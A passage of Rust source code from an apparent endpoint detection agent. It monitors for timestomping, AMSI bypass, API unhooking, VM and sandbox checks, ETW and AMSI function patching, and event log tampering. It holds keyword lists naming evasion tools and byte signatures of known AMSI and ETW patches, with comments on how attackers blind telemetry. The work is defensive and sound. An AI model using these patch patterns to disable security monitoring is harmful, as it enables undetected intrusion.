                                    new_value: None,
                                };

                                let event = Self::create_evasion_event(&evasion);
                                if tx.send(event).await.is_err() {
                                    return;
                                }
                            }

                            // 2. Check for timestamp changes on existing files
                            if let Some((prev_created, prev_modified, _prev_accessed)) =
                                file_times.get(&path_str)
                            {
                                // Created time changed (should never change)
                                if *prev_created != created {
                                    let evasion = DefenseEvasionEvent {
                                        evasion_type: EvasionType::Timestomping,
                                        pid: 0,
                                        process_name: "unknown".to_string(),
                                        process_path: String::new(),
                                        cmdline: String::new(),
                                        user: String::new(),
                                        target: path_str.clone(),
                                        details:
                                            "File creation time changed - timestomping detected"
                                                .to_string(),
                                        original_value: Some(format!("{:?}", prev_created)),
                                        new_value: Some(format!("{:?}", created)),
                                    };

                                    let event = Self::create_evasion_event(&evasion);
                                    if tx.send(event).await.is_err() {
                                        return;
                                    }
                                }

                                // Modified time went backwards
                                if modified < *prev_modified {
                                    let evasion = DefenseEvasionEvent {
                                        evasion_type: EvasionType::Timestomping,
                                        pid: 0,
                                        process_name: "unknown".to_string(),
                                        process_path: String::new(),
                                        cmdline: String::new(),
                                        user: String::new(),
                                        target: path_str.clone(),
                                        details: "File modified time went backwards - timestomping detected".to_string(),
                                        original_value: Some(format!("{:?}", prev_modified)),
                                        new_value: Some(format!("{:?}", modified)),
                                    };

                                    let event = Self::create_evasion_event(&evasion);
                                    if tx.send(event).await.is_err() {
                                        return;
                                    }
                                }
                            }

                            file_times.insert(path_str, (created, modified, accessed));
                        }
                    }
                }
            }

            // Cleanup old entries
            if file_times.len() > 10000 {
                file_times.clear();
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn monitor_amsi_bypass(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use sysinfo::System;

        info!("Starting AMSI bypass detection monitor");

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        // Known AMSI bypass patterns in command lines
        let amsi_bypass_patterns = [
            "amsicontext",
            "amsiinitfailed",
            "amsiutils",
            "amsiscanbuffer",
            "amsi.dll",
            "reflection.assembly",
            "[ref].assembly.gettype",
            "system.management.automation.amsi",
            "amsibypass",
            "disable-amsi",
            "setsecuritycontext",
        ];

        loop {
            interval.tick().await;

            system.refresh_processes();

            for (pid, process) in system.processes() {
                let cmdline = process.cmd().join(" ").to_lowercase();
                let name = process.name().to_lowercase();

                // Only check PowerShell processes
                if !name.contains("powershell") && !name.contains("pwsh") {
                    continue;
                }

                // Check for AMSI bypass patterns
                for pattern in &amsi_bypass_patterns {
                    if cmdline.contains(pattern) {
                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::AmsiBypass,
                            pid: pid.as_u32(),
                            process_name: process.name().to_string(),
                            process_path: process
                                .exe()
                                .map(|p| p.to_string_lossy().to_string())
                                .unwrap_or_default(),
                            cmdline: cmdline.clone(),
                            user: String::new(),
                            target: "AMSI".to_string(),
                            details: format!("AMSI bypass attempt detected: pattern '{}'", pattern),
                            original_value: None,
                            new_value: None,
                        };

                        let event = Self::create_evasion_event(&evasion);
                        if tx.send(event).await.is_err() {
                            return;
                        }
                        break;
                    }
                }

                // Check for base64 encoded AMSI bypass
                if cmdline.contains("-enc") || cmdline.contains("-encodedcommand") {
                    // Look for base64 strings that might be AMSI bypass
                    for part in cmdline.split_whitespace() {
                        if part.len() > 50 {
                            // Try to decode and check
                            if let Ok(decoded) = base64::decode(part) {
                                if let Ok(decoded_str) = String::from_utf8(decoded) {
                                    let decoded_lower = decoded_str.to_lowercase();
                                    for pattern in &amsi_bypass_patterns {
                                        if decoded_lower.contains(pattern) {
                                            let evasion = DefenseEvasionEvent {
                                                evasion_type: EvasionType::AmsiBypass,
                                                pid: pid.as_u32(),
                                                process_name: process.name().to_string(),
                                                process_path: process
                                                    .exe()
                                                    .map(|p| p.to_string_lossy().to_string())
                                                    .unwrap_or_default(),
                                                cmdline: cmdline.clone(),
                                                user: String::new(),
                                                target: "AMSI".to_string(),
                                                details: format!(
                                                    "Encoded AMSI bypass detected: pattern '{}'",
                                                    pattern
                                                ),
                                                original_value: None,
                                                new_value: Some(decoded_str.clone()),
                                            };

                                            let event = Self::create_evasion_event(&evasion);
                                            if tx.send(event).await.is_err() {
                                                return;
                                            }
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn monitor_api_unhooking(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use sysinfo::System;

        info!("Starting API unhooking detection monitor");

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        // Patterns indicating API unhooking or direct syscalls
        let unhooking_patterns = [
            "ntdll",
            "knowndlls",
            "syscall",
            "heavensgate",
            "hells gate",
            "halosgate",
            "tartarus",
            "syswhispers",
            "freshycalls",
            "getprocaddress",
            "loadlibrary",
            "mapviewoffile",
            "ntmapviewofsection",
        ];

        loop {
            interval.tick().await;

            system.refresh_processes();

            for (pid, process) in system.processes() {
                let cmdline = process.cmd().join(" ").to_lowercase();

                // Check for patterns indicating unhooking
                for pattern in &unhooking_patterns {
                    if cmdline.contains(pattern) {
                        // More specific checks to reduce false positives
                        if cmdline.contains("copy") && cmdline.contains("ntdll") {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::ApiUnhooking,
                                pid: pid.as_u32(),
                                process_name: process.name().to_string(),
                                process_path: process
                                    .exe()
                                    .map(|p| p.to_string_lossy().to_string())
                                    .unwrap_or_default(),
                                cmdline: cmdline.clone(),
                                user: String::new(),
                                target: "ntdll.dll".to_string(),
                                details: "Potential ntdll.dll remapping for API unhooking"
                                    .to_string(),
                                original_value: None,
                                new_value: None,
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn monitor_vm_sandbox_evasion(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use sysinfo::System;

        info!("Starting VM/sandbox evasion detection monitor");

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        // VM detection indicators
        let vm_indicators = [
            "vmware",
            "virtualbox",
            "vbox",
            "qemu",
            "xen",
            "hyper-v",
            "parallels",
            "virtual",
            "bochs",
        ];

        // Analysis tool processes
        // NOTE: These are legitimate development and security tools. Detections
        // from this list should be treated as informational/low severity only,
        // not as alerts. They indicate potential anti-analysis behavior by
        // OTHER processes checking for these tools, not that the tools themselves
        // are malicious.
        let analysis_tools = [
            "procmon",
            "procmon64",
            "procexp",
            "procexp64",
            "wireshark",
            "fiddler",
            "x64dbg",
            "x32dbg",
            "ollydbg",
            "ida",
            "ida64",
            "ghidra",
            "pestudio",
            "processhacker",
            "apimonitor",
            "regshot",
            "autoruns",
            "tcpview",
        ];

        // Sandbox detection patterns
        let sandbox_patterns = [
            "sandbox",
            "sample",
            "malware",
            "virus",
            "test",
            "cuckoo",
            "joe",
            "any.run",
            "hybrid-analysis",
        ];

        loop {
            interval.tick().await;

            system.refresh_processes();

            for (pid, process) in system.processes() {
                let cmdline = process.cmd().join(" ").to_lowercase();
                let name = process.name().to_lowercase();

                // Check for VM detection attempts (registry queries, WMI queries)
                if name.contains("reg") || name.contains("wmic") || name.contains("powershell") {
                    for indicator in &vm_indicators {
                        if cmdline.contains(indicator) {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::VmDetection,
                                pid: pid.as_u32(),
                                process_name: process.name().to_string(),
                                process_path: process
                                    .exe()
                                    .map(|p| p.to_string_lossy().to_string())
                                    .unwrap_or_default(),
                                cmdline: cmdline.clone(),
                                user: String::new(),
                                target: indicator.to_string(),
                                details: format!(
                                    "VM detection attempt: checking for {}",
                                    indicator
                                ),
                                original_value: None,
                                new_value: None,
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                            break;
                        }
                    }
                }

                // Check for analysis tool detection
                if name.contains("tasklist") || name.contains("powershell") || name.contains("wmic")
                {
                    for tool in &analysis_tools {
                        if cmdline.contains(tool) {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::AnalysisToolDetection,
                                pid: pid.as_u32(),
                                process_name: process.name().to_string(),
                                process_path: process
                                    .exe()
                                    .map(|p| p.to_string_lossy().to_string())
                                    .unwrap_or_default(),
                                cmdline: cmdline.clone(),
                                user: String::new(),
                                target: tool.to_string(),
                                details: format!(
                                    "Analysis tool detection attempt: checking for {}",
                                    tool
                                ),
                                original_value: None,
                                new_value: None,
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                            break;
                        }
                    }
                }

                // Check for sandbox detection (user/computer name checks)
                if name.contains("whoami")
                    || name.contains("hostname")
                    || name.contains("powershell")
                {
                    for pattern in &sandbox_patterns {
                        if cmdline.contains(pattern) {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::SandboxEvasion,
                                pid: pid.as_u32(),
                                process_name: process.name().to_string(),
                                process_path: process
                                    .exe()
                                    .map(|p| p.to_string_lossy().to_string())
                                    .unwrap_or_default(),
                                cmdline: cmdline.clone(),
                                user: String::new(),
                                target: pattern.to_string(),
                                details: format!(
                                    "Sandbox detection attempt: checking for {}",
                                    pattern
                                ),
                                original_value: None,
                                new_value: None,
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                            break;
                        }
                    }
                }
            }
        }
    }

    // ==================== EDR Blinding: ETW Patching Detection ====================
    //
    // Detects patching of ETW functions in ntdll.dll (T1562.006).
    // Attackers blind EDR by patching EtwEventWrite and related functions
    // with `ret` (0xC3) or `xor eax,eax; ret` to silently suppress telemetry.
    //
    // Strategy:
    //   1. On startup, resolve ETW function addresses via GetProcAddress
    //   2. Read the first 16 bytes of each function as a baseline
    //   3. Every 15 seconds, re-read and compare against baseline
    //   4. Detect known patching patterns: `ret`, `xor eax,eax; ret`, JMP to outside ntdll
    //
    #[cfg(target_os = "windows")]
    async fn monitor_etw_patching(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use std::collections::HashMap;

        info!("Starting ETW patching detection monitor (T1562.006)");

        // ETW functions in ntdll.dll that are commonly patched
        let etw_functions = [
            "EtwEventWrite",
            "EtwEventWriteEx",
            "EtwEventWriteFull",
            "NtTraceEvent",
            "NtTraceControl",
        ];

        // Capture baselines of function prologues
        let mut baselines: HashMap<String, (usize, Vec<u8>)> = HashMap::new();
        let mut ntdll_range: Option<(usize, usize)> = None; // (base, end)

        // Resolve ntdll.dll module base and size
        unsafe {
            use windows::core::PCSTR;
            use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
            use windows::Win32::System::ProcessStatus::{GetModuleInformation, MODULEINFO};
            use windows::Win32::System::Threading::GetCurrentProcess;

            let ntdll_name = PCSTR::from_raw(b"ntdll.dll\0".as_ptr());
            let ntdll_handle = match GetModuleHandleA(ntdll_name) {
                Ok(h) => h,
                Err(e) => {
                    error!("Failed to get ntdll.dll handle: {}", e);
                    return;
                }
            };

            // Get ntdll memory range for JMP target validation
            let mut mod_info = MODULEINFO::default();
            let process = GetCurrentProcess();
            if GetModuleInformation(
                process,
                ntdll_handle,
                &mut mod_info,
                std::mem::size_of::<MODULEINFO>() as u32,
            )
            .is_ok()
            {
                let base = mod_info.lpBaseOfDll as usize;
                let end = base + mod_info.SizeOfImage as usize;
                ntdll_range = Some((base, end));
                debug!("ntdll.dll range: 0x{:X} - 0x{:X}", base, end);
            }

            // Baseline each ETW function
            for func_name in &etw_functions {
                let func_cstr = format!("{}\0", func_name);
                let func_pcstr = PCSTR::from_raw(func_cstr.as_ptr());

                if let Some(addr) = GetProcAddress(ntdll_handle, func_pcstr) {
                    let func_addr = addr as usize;
                    // Read first 16 bytes as baseline prologue
                    let prologue_ptr = func_addr as *const u8;
                    let mut prologue = vec![0u8; 16];
                    std::ptr::copy_nonoverlapping(prologue_ptr, prologue.as_mut_ptr(), 16);

                    debug!(
                        "ETW baseline: {} @ 0x{:X} = {:02X?}",
                        func_name,
                        func_addr,
                        &prologue[..8]
                    );
                    baselines.insert(func_name.to_string(), (func_addr, prologue));
                } else {
                    warn!("Could not resolve {}, skipping ETW baseline", func_name);
                }
            }
        }

        if baselines.is_empty() {
            warn!("No ETW functions baselined, ETW patching detection disabled");
            return;
        }

        info!(
            "ETW patching detection initialized: {} functions baselined",
            baselines.len()
        );

        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        loop {
            interval.tick().await;

            for (func_name, (func_addr, baseline_bytes)) in &baselines {
                unsafe {
                    let prologue_ptr = *func_addr as *const u8;
                    let mut current = vec![0u8; 16];
                    std::ptr::copy_nonoverlapping(prologue_ptr, current.as_mut_ptr(), 16);

                    // Check if prologue has changed from baseline
                    if current != *baseline_bytes {
                        // Determine the specific patching pattern
                        let patch_desc = Self::classify_etw_patch(&current, &ntdll_range);

                        warn!(
                            "ETW TAMPER DETECTED: {} @ 0x{:X} patched! Pattern: {}",
                            func_name, func_addr, patch_desc
                        );

                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::EtwTampering,
                            pid: std::process::id(),
                            process_name: "self".to_string(),
                            process_path: String::new(),
                            cmdline: String::new(),
                            user: String::new(),
                            target: format!("ntdll.dll!{}", func_name),
                            details: format!(
                                "ETW function prologue patched ({}). This blinds EDR telemetry.",
                                patch_desc
                            ),
                            original_value: Some(format!("{:02X?}", &baseline_bytes[..8])),
                            new_value: Some(format!("{:02X?}", &current[..8])),
                        };

                        let event = Self::create_evasion_event(&evasion);
                        if tx.send(event).await.is_err() {
                            return;
                        }
                    }
                }
            }
        }
    }

    /// Classify the type of ETW patching applied to a function prologue.
    #[cfg(target_os = "windows")]
    fn classify_etw_patch(bytes: &[u8], ntdll_range: &Option<(usize, usize)>) -> String {
        if bytes.is_empty() {
            return "unknown (empty)".to_string();
        }

        // Pattern: ret (0xC3) at function start
        if bytes[0] == 0xC3 {
            return "ret at function start (0xC3)".to_string();
        }

        // Pattern: xor eax,eax; ret (0x33 0xC0 0xC3) - returns 0/STATUS_SUCCESS
        if bytes.len() >= 3 && bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3 {
            return "xor eax,eax; ret (0x33C0C3) - returns STATUS_SUCCESS".to_string();
        }

        // Pattern: xor eax,eax; ret via alternate encoding
        // 31 C0 C3 = xor eax,eax; ret (AT&T syntax encoding)
        if bytes.len() >= 3 && bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3 {
            return "xor eax,eax; ret (0x31C0C3) - returns STATUS_SUCCESS".to_string();
        }

        // Pattern: mov eax, imm32; ret (B8 xx xx xx xx C3)
        if bytes.len() >= 6 && bytes[0] == 0xB8 && bytes[5] == 0xC3 {
            let imm = u32::from_le_bytes([bytes[1], bytes[2], bytes[3], bytes[4]]);
            return format!("mov eax, 0x{:08X}; ret - returns hardcoded value", imm);
        }

        // Pattern: JMP rel32 (E9 xx xx xx xx) - check if target is outside ntdll
        if bytes.len() >= 5 && bytes[0] == 0xE9 {
            let offset = i32::from_le_bytes([bytes[1], bytes[2], bytes[3], bytes[4]]);
            // JMP is relative to the NEXT instruction (current + 5)
            // We don't have the exact address here, but if ntdll_range is set
            // the caller could check. For classification we note the pattern.
            if let Some((base, end)) = ntdll_range {
                return format!(
                    "JMP rel32 (offset {}) - potential detour outside ntdll (0x{:X}-0x{:X})",
                    offset, base, end
                );
            }
            return format!("JMP rel32 (offset {}) - potential detour", offset);
        }

        // Pattern: JMP [rip+disp32] (FF 25 xx xx xx xx) - indirect jump
        if bytes.len() >= 6 && bytes[0] == 0xFF && bytes[1] == 0x25 {
            return "JMP [rip+disp32] (FF 25) - indirect jump/detour".to_string();
        }

        // Pattern: NOP sled (90 90 90...)
        if bytes.iter().take(4).all(|b| *b == 0x90) {
            return "NOP sled at function start".to_string();
        }

        // Pattern: INT 3 (CC) breakpoint
        if bytes[0] == 0xCC {
            return "INT3 breakpoint (0xCC) at function start".to_string();
        }

        // Generic change
        format!("modified prologue: {:02X?}", &bytes[..bytes.len().min(8)])
    }

    // ==================== EDR Blinding: AMSI Memory Patching Detection ====================
    //
    // Detects in-memory patching of AMSI functions in amsi.dll (T1562.001).
    // Attackers commonly patch AmsiScanBuffer/AmsiScanString to return
    // AMSI_RESULT_NOT_DETECTED, bypassing script scanning in PowerShell,
    // JScript, and VBScript hosts.
    //
    // Strategy:
    //   1. Load amsi.dll, baseline AmsiScanBuffer, AmsiScanString,
    //      AmsiInitialize, AmsiOpenSession prologues
    //   2. Every 10 seconds, re-read and compare against baselines
    //   3. Detect known AMSI bypass patterns (mov eax,0x80070057; ret, etc.)
    //   4. Enumerate AMSI host processes and check their copies of amsi.dll
    //
    #[cfg(target_os = "windows")]
    async fn monitor_amsi_memory_patching(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use std::collections::HashMap;

        info!("Starting AMSI memory patching detection monitor (T1562.001)");

        // AMSI functions to baseline
        let amsi_functions = [
            "AmsiScanBuffer",
            "AmsiScanString",
            "AmsiInitialize",
            "AmsiOpenSession",
        ];

        // Capture baselines from our own process's copy of amsi.dll
        let mut baselines: HashMap<String, (usize, Vec<u8>)> = HashMap::new();

        unsafe {
            use windows::core::PCSTR;
            use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};

            let amsi_handle = match LoadLibraryA(PCSTR::from_raw(b"amsi.dll\0".as_ptr())) {
                Ok(h) => h,
                Err(e) => {
                    warn!("Could not load amsi.dll for baselining: {} - AMSI monitor will use pattern-only detection", e);
                    // amsi.dll might not be loaded yet; use a retry loop
                    let mut retry_interval =
                        tokio::time::interval(tokio::time::Duration::from_secs(30));
                    loop {
                        retry_interval.tick().await;
                        match LoadLibraryA(PCSTR::from_raw(b"amsi.dll\0".as_ptr())) {
                            Ok(h) => break h,
                            Err(_) => continue,
                        }
                    }
                }
            };

            for func_name in &amsi_functions {
                let func_cstr = format!("{}\0", func_name);
                let func_pcstr = PCSTR::from_raw(func_cstr.as_ptr());

                if let Some(addr) = GetProcAddress(amsi_handle, func_pcstr) {
                    let func_addr = addr as usize;
                    let prologue_ptr = func_addr as *const u8;
                    let mut prologue = vec![0u8; 16];
                    std::ptr::copy_nonoverlapping(prologue_ptr, prologue.as_mut_ptr(), 16);

                    debug!(
                        "AMSI baseline: {} @ 0x{:X} = {:02X?}",
                        func_name,
                        func_addr,
                        &prologue[..8]
                    );
                    baselines.insert(func_name.to_string(), (func_addr, prologue));
                } else {
                    warn!("Could not resolve amsi.dll!{}", func_name);
                }
            }
        }

        if baselines.is_empty() {
            warn!("No AMSI functions baselined, AMSI patching detection disabled");
            return;
        }

        info!(
            "AMSI patching detection initialized: {} functions baselined",
            baselines.len()
        );

        // AMSI host process names that load amsi.dll
        let _amsi_hosts: HashSet<&str> = [
            "powershell.exe",
            "pwsh.exe",
            "wscript.exe",
            "cscript.exe",
            "mshta.exe",
            "jscript.exe",
        ]
        .iter()
        .cloned()
        .collect();

        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        loop {
            interval.tick().await;

            // Check our own process's AMSI functions first (covers in-proc bypass)
            for (func_name, (func_addr, baseline_bytes)) in &baselines {
                unsafe {
                    let prologue_ptr = *func_addr as *const u8;
                    let mut current = vec![0u8; 16];
                    std::ptr::copy_nonoverlapping(prologue_ptr, current.as_mut_ptr(), 16);

                    if current != *baseline_bytes {
                        let patch_desc = Self::classify_amsi_patch(&current);

                        warn!(
                            "AMSI TAMPER DETECTED: {} @ 0x{:X} patched! Pattern: {}",
                            func_name, func_addr, patch_desc
                        );

                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::AmsiBypass,
                            pid: std::process::id(),
                            process_name: "self".to_string(),
                            process_path: String::new(),
                            cmdline: String::new(),
                            user: String::new(),
                            target: format!("amsi.dll!{}", func_name),
                            details: format!(
                                "AMSI function prologue patched ({}). Malware scanning bypassed.",
                                patch_desc
                            ),
                            original_value: Some(format!("{:02X?}", &baseline_bytes[..8])),
                            new_value: Some(format!("{:02X?}", &current[..8])),
                        };

                        let event = Self::create_evasion_event(&evasion);
                        if tx.send(event).await.is_err() {
                            return;
                        }
                    }
                }
            }

            // Check AMSI host processes for cross-process patching
            // Uses ReadProcessMemory to read amsi.dll in target processes
            Self::check_amsi_in_host_processes(&tx, &baselines).await;
        }
    }

    /// Check AMSI functions in host processes (PowerShell, JScript, VBScript)
    /// by reading their memory copies of amsi.dll.
    #[cfg(target_os = "windows")]
    async fn check_amsi_in_host_processes(
        tx: &mpsc::Sender<TelemetryEvent>,
        baselines: &std::collections::HashMap<String, (usize, Vec<u8>)>,
    ) {
        use sysinfo::System;

        let amsi_host_names: HashSet<&str> = [
            "powershell.exe",
            "pwsh.exe",
            "wscript.exe",
            "cscript.exe",
            "mshta.exe",
        ]
        .iter()
        .cloned()
        .collect();

        let mut system = System::new();
        system.refresh_processes();

        for (pid, process) in system.processes() {
            let name = process.name().to_lowercase();

            let is_amsi_host = amsi_host_names.iter().any(|h| name == *h);
            if !is_amsi_host {
                continue;
            }

            let pid_u32 = pid.as_u32();

            // Try to read the target process's amsi.dll module memory
            unsafe {
                use windows::Win32::Foundation::CloseHandle;
                use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
                use windows::Win32::System::Diagnostics::ToolHelp::{
                    CreateToolhelp32Snapshot, Module32FirstW, Module32NextW, MODULEENTRY32W,
                    TH32CS_SNAPMODULE, TH32CS_SNAPMODULE32,
                };
                use windows::Win32::System::Threading::{
                    OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
                };

                // Open the target process
                let process_handle = match OpenProcess(
                    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                    false,
                    pid_u32,
                ) {
                    Ok(h) => h,
                    Err(_) => continue, // Access denied is expected for some processes
                };

                // Find amsi.dll base address in the target process
                let mut amsi_base: Option<usize> = None;
                if let Ok(snapshot) =
                    CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid_u32)
                {
                    let mut entry = MODULEENTRY32W {
                        dwSize: std::mem::size_of::<MODULEENTRY32W>() as u32,
                        ..Default::default()
                    };

                    if Module32FirstW(snapshot, &mut entry).is_ok() {
                        loop {
                            let mod_name = String::from_utf16_lossy(
                                &entry.szModule[..entry
                                    .szModule
                                    .iter()
                                    .position(|&c| c == 0)
                                    .unwrap_or(entry.szModule.len())],
                            )
                            .to_lowercase();

                            if mod_name == "amsi.dll" {
                                amsi_base = Some(entry.modBaseAddr as usize);
                                break;
                            }

                            if Module32NextW(snapshot, &mut entry).is_err() {
                                break;
                            }
                        }
                    }
                    let _ = CloseHandle(snapshot);
                }

                if let Some(remote_base) = amsi_base {
                    // For each baselined function, calculate offset from our base and read from remote
                    // We need amsi.dll base in OUR process to compute offsets
                    let our_amsi_base = {
                        use windows::core::PCSTR;
                        use windows::Win32::System::LibraryLoader::GetModuleHandleA;
                        let name = PCSTR::from_raw(b"amsi.dll\0".as_ptr());
                        GetModuleHandleA(name).ok().map(|h| h.0 as usize)
                    };

                    if let Some(our_base) = our_amsi_base {
                        for (func_name, (func_addr, baseline_bytes)) in baselines {
                            let offset = *func_addr - our_base;
                            let remote_func_addr = remote_base + offset;

                            let mut remote_bytes = vec![0u8; 16];
                            let mut bytes_read = 0usize;

                            let read_ok = ReadProcessMemory(
                                process_handle,
                                remote_func_addr as *const std::ffi::c_void,
                                remote_bytes.as_mut_ptr() as *mut std::ffi::c_void,
                                16,
                                Some(&mut bytes_read),
                            );

                            if read_ok.is_ok() && bytes_read == 16 {
                                if remote_bytes != *baseline_bytes {
                                    let patch_desc = Self::classify_amsi_patch(&remote_bytes);

                                    warn!(
                                        "AMSI TAMPER in PID {}: {} patched! Pattern: {}",
                                        pid_u32, func_name, patch_desc
                                    );

                                    let evasion = DefenseEvasionEvent {
                                        evasion_type: EvasionType::AmsiBypass,
                                        pid: pid_u32,
                                        process_name: name.clone(),
                                        process_path: process
                                            .exe()
                                            .map(|p| p.to_string_lossy().to_string())
                                            .unwrap_or_default(),
                                        cmdline: process.cmd().join(" "),
                                        user: String::new(),
                                        target: format!("amsi.dll!{}", func_name),
                                        details: format!(
                                            "AMSI function patched in {} (PID {}). Pattern: {}",
                                            name, pid_u32, patch_desc
                                        ),
                                        original_value: Some(format!(
                                            "{:02X?}",
                                            &baseline_bytes[..8]
                                        )),
                                        new_value: Some(format!("{:02X?}", &remote_bytes[..8])),
                                    };

                                    let event = Self::create_evasion_event(&evasion);
                                    if tx.send(event).await.is_err() {
                                        let _ = CloseHandle(process_handle);
                                        return;
                                    }
                                }
                            }
                        }
                    }
                }

                let _ = CloseHandle(process_handle);
            }
        }
    }

    /// Classify the type of AMSI patching applied.
    #[cfg(target_os = "windows")]
    fn classify_amsi_patch(bytes: &[u8]) -> String {
        if bytes.is_empty() {
            return "unknown (empty)".to_string();
        }

        // Pattern: ret (0xC3) at start
        if bytes[0] == 0xC3 {
            return "ret at function start (0xC3) - AMSI disabled".to_string();
        }

        // Pattern: mov eax, 0x80070057; ret (E_INVALIDARG / AMSI_RESULT_NOT_DETECTED)
        // B8 57 00 07 80 C3
        if bytes.len() >= 6
            && bytes[0] == 0xB8
            && bytes[1] == 0x57
            && bytes[2] == 0x00
            && bytes[3] == 0x07
            && bytes[4] == 0x80
            && bytes[5] == 0xC3
        {
            return "mov eax, 0x80070057; ret - returns E_INVALIDARG (AMSI bypass)".to_string();
        }

        // Pattern: mov eax, imm32; ret (generic)
        if bytes.len() >= 6 && bytes[0] == 0xB8 && bytes[5] == 0xC3 {
            let imm = u32::from_le_bytes([bytes[1], bytes[2], bytes[3], bytes[4]]);
            return format!("mov eax, 0x{:08X}; ret - returns hardcoded HRESULT", imm);
        }

        // Pattern: xor eax,eax; ret (returns S_OK / AMSI_RESULT_CLEAN)
        if bytes.len() >= 3 && bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3 {
            return "xor eax,eax; ret (0x33C0C3) - returns S_OK (AMSI bypass)".to_string();
        }
        if bytes.len() >= 3 && bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3 {
            return "xor eax,eax; ret (0x31C0C3) - returns S_OK (AMSI bypass)".to_string();
        }

        // Pattern: JMP
        if bytes[0] == 0xE9 {
            return "JMP rel32 - function detoured".to_string();
        }
        if bytes.len() >= 2 && bytes[0] == 0xFF && bytes[1] == 0x25 {
            return "JMP [rip+disp32] - indirect detour".to_string();
        }

        // Pattern: NOP
        if bytes[0] == 0x90 {
            return "NOP at function start".to_string();
        }

        format!("modified prologue: {:02X?}", &bytes[..bytes.len().min(8)])
    }

    // ==================== EDR Blinding: Event Log Service Integrity Monitor ====================
    //
    // Detects sophisticated Event Log tampering (T1070.001):
    //   - Event Log service (svchost -k LocalServiceNetworkRestricted) thread termination
    //   - .evtx file deletion/modification/truncation
    //   - Security/System/Application event channel heartbeat failures
    //   - wevtutil.exe cl Security style commands (existing, enhanced)
    //
    #[cfg(target_os = "windows")]
    async fn monitor_event_log_service_integrity(
        tx: mpsc::Sender<TelemetryEvent>,
        interval_ms: u64,
    ) {
        use std::collections::HashMap;
        use std::fs;

        info!("Starting Event Log service integrity monitor (T1070.001)");

        // .evtx files to monitor for deletion/modification
        let evtx_dir = "C:\\Windows\\System32\\winevt\\Logs";
        let critical_logs = [
            "Security.evtx",
            "System.evtx",
            "Application.evtx",
            "Microsoft-Windows-Sysmon%4Operational.evtx",
            "Microsoft-Windows-PowerShell%4Operational.evtx",
            "Microsoft-Windows-Windows Defender%4Operational.evtx",
        ];

        // Track .evtx file sizes and modification times for integrity monitoring
        let mut evtx_sizes: HashMap<String, (u64, std::time::SystemTime)> = HashMap::new();

        // Initialize .evtx file baseline sizes
        for log_name in &critical_logs {
            let path = format!("{}\\{}", evtx_dir, log_name);
            if let Ok(metadata) = fs::metadata(&path) {
                let size = metadata.len();
                let modified = metadata
                    .modified()
                    .unwrap_or(std::time::SystemTime::UNIX_EPOCH);
                evtx_sizes.insert(path.clone(), (size, modified));
                debug!("EVTX baseline: {} = {} bytes", log_name, size);
            }
        }

        // Track the Event Log service thread count for thread-kill detection
        let mut eventlog_thread_count: Option<u32> = None;
        let mut eventlog_svchost_pid: Option<u32> = None;

        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        loop {
            interval.tick().await;

            // === 1. Monitor Event Log service process integrity ===
            Self::check_event_log_service(
                &tx,
                &mut eventlog_svchost_pid,
                &mut eventlog_thread_count,
            )
            .await;

            // === 2. Monitor .evtx file integrity ===
            for log_name in &critical_logs {
                let path = format!("{}\\{}", evtx_dir, log_name);

                match fs::metadata(&path) {
                    Ok(metadata) => {
                        let current_size = metadata.len();
                        let current_modified = metadata
                            .modified()
                            .unwrap_or(std::time::SystemTime::UNIX_EPOCH);

                        if let Some((prev_size, _prev_modified)) = evtx_sizes.get(&path) {
                            // Detect truncation (size decreased significantly)
                            if current_size < *prev_size && (*prev_size - current_size) > 1024 {
                                warn!(
                                    "EVTX TRUNCATION: {} shrank from {} to {} bytes",
                                    log_name, prev_size, current_size
                                );

                                let evasion = DefenseEvasionEvent {
                                    evasion_type: EvasionType::EventLogServiceTamper,
                                    pid: 0,
                                    process_name: "unknown".to_string(),
                                    process_path: String::new(),
                                    cmdline: String::new(),
                                    user: String::new(),
                                    target: path.clone(),
                                    details: format!(
                                        "Event log file truncated: {} ({} -> {} bytes)",
                                        log_name, prev_size, current_size
                                    ),
                                    original_value: Some(format!("{} bytes", prev_size)),
